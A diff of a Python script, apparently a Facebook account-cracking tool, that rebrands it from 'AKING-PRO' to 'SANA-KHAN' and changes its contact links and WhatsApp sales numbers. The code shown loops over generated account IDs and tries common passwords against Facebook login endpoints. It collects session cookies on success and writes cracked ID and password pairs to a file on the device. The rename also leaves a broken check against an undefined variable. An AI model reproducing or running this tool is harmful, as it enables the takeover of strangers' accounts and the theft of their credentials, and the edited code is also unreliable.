@@ -47,22 +47,29 @@ for agent in range(10000):
         fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
         ugen.append(fullagnt)
 logo=("""\033[1;37m
-  .d8b.  db   dD d888888b d8b   db  d888b 
- d8' `8b 88 ,8P'   `88'   888o  88 88' Y8b
- 88ooo88 88,8P      88    88V8o 88 88       \033[1;34m𝐏 \033[1;37m
- 88~~~88 88`8b      88    88 V8o88 88  ooo.\033[1;31m 𝐑\033[1;37m
- 88   88 88 `88.   .88.   88  V888 88. ~8~  \033[1;35m𝐎 \033[1;37m
- YP   YP YP   YD Y888888P VP   V8P  Y888P   
+  
+ .d8888b.        d8888 888b    888        d8888 
+d88P  Y88b      d88888 8888b   888       d88888 
+Y88b.          d88P888 88888b  888      d88P888 
+ "Y888b.      d88P 888 888Y88b 888     d88P 888 
+    "Y88b.   d88P  888 888 Y88b888    d88P  888 
+      "888  d88P   888 888  Y88888   d88P   888 
+Y88b  d88P d8888888888 888   Y8888  d8888888888 
+ "Y8888P" d88P     888 888    Y888 d88P     888 
+                                                
+                                                
+                                                
+   
 ----------------------------------------------
  Author    : SANA KHAN
  Github    : SANAKHAN1
  Facebook  : .SANA.KHAN
- Tool Name : AKING-PRO
- Type type : PAID
+ Tool Name : SANA-KHAN
+ Type type : FREE
  Version   : 1.9.8
 ----------------------------------------------
- AKING Pro version 1.9.8
- For Haters: Tumhare Okat Nhi Mere BAAJI chodne Ke 🤞
+ SANA KHAN version 1.9.8
+ For Haters: SAB KAHO SUBHANALLAH ❤❤🤞
 \033[1;37m----------------------------------------------""")
 def linex():
         print('\033[1;37m----------------------------------------------')
@@ -301,7 +308,7 @@ def menu():
                         elif xd in ['7','07']:
                                 os.system('xdg-open https://mediafire.com/file/y1wvgc2zqqunxbn/AKING_VPN1.0.apk/file');menu()
                         elif xd in ['8','08']:
-                                os.system('xdg-open https://www.facebook.com/100084680097792/posts/pfbid0CZ9vn6qRF78vmdk4V3ja7Rx5mZa1hsmMaaTNXms2kkVyt1EZ7k5seWMjQd7pDfvvl/?app=fbl');menu()
+                                os.system('xdg-open https://www.facebook.com/profile.php?id=100024343126082/posts/pfbid0CZ9vn6qRF78vmdk4V3ja7Rx5mZa1hsmMaaTNXms2kkVyt1EZ7k5seWMjQd7pDfvvl/?app=fbl');menu()
                         elif xd in ['0','00']:
                                 exit(' Thanks for use 🥰 ')
                         else:
@@ -320,10 +327,10 @@ def menu():
                         linex()
                         print(" Your Subscription Date Expire")
                         linex()
-                        url_wa = "https://api.whatsapp.com/send?phone=+923150665740&text="
+                        url_wa = "https://api.whatsapp.com/send?phone=+923453743117&text="
                         name = input(" Enter your Name : ")
                         linex()
-                        tks = ("Hi Aking Sir, I Need To Buy Your Paid AKING PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
+                        tks = ("Hi SANA MAM, I Need To Buy Your Paid AKING PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                         subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                         print(' Run :  python AKING.py')
                         exit()
@@ -354,7 +361,7 @@ def pak():
                         for psx in user:
                                 ids = code+psx
                                 passlist = [psx,ids,'khankhan','khan1122','khan12345','khan1234','khan12','khan786','khan123','khan123456','khankhan123','786786']
-                                Aking.submit(rndm,ids,passlist)
+                                SANA.submit(rndm,ids,passlist)
                 print('\033[1;37m')
                 linex()
                 print(' The process has completed')
@@ -467,7 +474,7 @@ def ffb(ids,names,passlist):
                         idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                         complete = session.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                         Aking=session.cookies.get_dict().keys()
-                        if "c_user" in Aking:
+                        if "c_user" in sana:
                                 coki=session.cookies.get_dict()
                                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                 print('\r\r\033[1;32m [SANA-OK] %s | %s'%(ids,pas))
@@ -689,7 +696,7 @@ def rndm(ids,passlist):
                                                         break
                                         except:
                                                 print('\r\r\033[1;32m [SANA-OK] '+uid+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/AKING-OK.txt','a').write(uid+'|'+pas+'\n')
+                                                open('/sdcard/SANA-OK.txt','a').write(uid+'|'+pas+'\n')
                                                 oks.append(ids)
                                                 break
                                 else:
